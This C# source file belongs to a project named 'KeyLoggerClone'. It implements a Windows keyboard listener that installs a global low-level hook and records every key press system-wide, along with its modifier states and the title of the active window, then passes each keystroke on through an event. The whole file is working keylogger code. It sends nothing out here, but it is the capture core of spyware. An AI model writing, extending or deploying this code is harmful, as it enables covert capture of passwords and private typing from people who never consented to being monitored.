using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using KeyLoggerClone.Core;

namespace KeyLoggerClone.Listeners
{
    /// <summary>
    /// Windows-specific implementation of keyboard listening using global low-level hooks (WH_KEYBOARD_LL).
    /// </summary>
    public class WindowsKeyboardListener : IKeyboardListener
    {
        private IntPtr _hookId = IntPtr.Zero;
        private readonly Win32Api.HookProc _hookProcedure;
        
        public event EventHandler<KeyInterceptedEventArgs> KeyIntercepted;

        public bool IsRunning => _hookId != IntPtr.Zero;

        public WindowsKeyboardListener()
        {
            // Keeping reference to delegate to prevent Garbage Collection from collecting it
            _hookProcedure = HookCallback;
        }

        public void Start()
        {
            if (IsRunning) return;

            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                if (curModule != null)
                {
                    _hookId = Win32Api.SetWindowsHookEx(
                        Win32Api.WH_KEYBOARD_LL,
                        _hookProcedure,
                        Win32Api.GetModuleHandle(curModule.ModuleName),
                        0
                    );
                }
            }

            if (_hookId == IntPtr.Zero)
            {
                throw new InvalidOperationException("Failed to install global keyboard hook.");
            }
        }

        public void Stop()
        {
            if (!IsRunning) return;

            Win32Api.UnhookWindowsHookEx(_hookId);
            _hookId = IntPtr.Zero;
        }

        private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && (wParam == (IntPtr)Win32Api.WM_KEYDOWN || wParam == (IntPtr)Win32Api.WM_SYSKEYDOWN))
            {
                // Marshal key information from structure pointer
                var hookStruct = Marshal.PtrToStructure<Win32Api.KBDLLHOOKSTRUCT>(lParam);
                uint vkCode = hookStruct.vkCode;
                uint scanCode = hookStruct.scanCode;

                // Query keyboard states
                bool isShift = (Win32Api.GetKeyState(Win32Api.VK_SHIFT) & 0x8000) != 0;
                bool isCtrl = (Win32Api.GetKeyState(Win32Api.VK_CONTROL) & 0x8000) != 0;
                bool isAlt = (Win32Api.GetKeyState(Win32Api.VK_MENU) & 0x8000) != 0;
                bool isCapsLock = (Win32Api.GetKeyState(Win32Api.VK_CAPITAL) & 0x0001) != 0;

                string keyName = ((Keys)vkCode).ToString();
                string activeWindow = Win32Api.GetActiveWindowTitle();

                // Raise event
                KeyIntercepted?.Invoke(this, new KeyInterceptedEventArgs(
                    vkCode,
                    scanCode,
                    keyName,
                    activeWindow,
                    isShift,
                    isCtrl,
                    isAlt,
                    isCapsLock
                ));
            }

            return Win32Api.CallNextHookEx(_hookId, nCode, wParam, lParam);
        }

        public void Dispose()
        {
            Stop();
            GC.SuppressFinalize(this);
        }
    }
}
